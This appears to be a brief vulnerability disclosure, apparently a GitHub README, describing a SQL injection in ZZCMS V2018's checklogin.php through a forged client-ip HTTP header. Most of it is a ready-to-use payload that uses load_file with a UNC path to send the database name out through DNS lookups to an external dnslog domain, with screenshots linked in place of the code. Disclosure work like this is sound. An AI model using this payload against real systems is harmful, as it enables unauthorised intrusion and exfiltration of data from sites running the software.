ZZCMS V2018

SQL Injection

code: 
user\checklogin.php
![image](https://github.com/P0rZ9/ZZCMS/blob/master/1.jpg)
Follow up this function：getip()
![image](https://github.com/P0rZ9/ZZCMS/blob/master/2.jpg)
check_isip is a filter function,Follow up:
![image](https://github.com/P0rZ9/ZZCMS/blob/master/3.jpg)
This is just a simple filter. It has nothing to do with it.So,We can forge IP to inject.

show:
At the time of landing,In HTTP head add this： client-ip: 122.122.122.122' and ((select load_file(concat('\\',(select database()),'.xxxx.ceye.io\abc'))))#

You can see that you have successfully obtained the Database name in dnslog platform.
![image](https://github.com/P0rZ9/ZZCMS/blob/master/4.jpg)
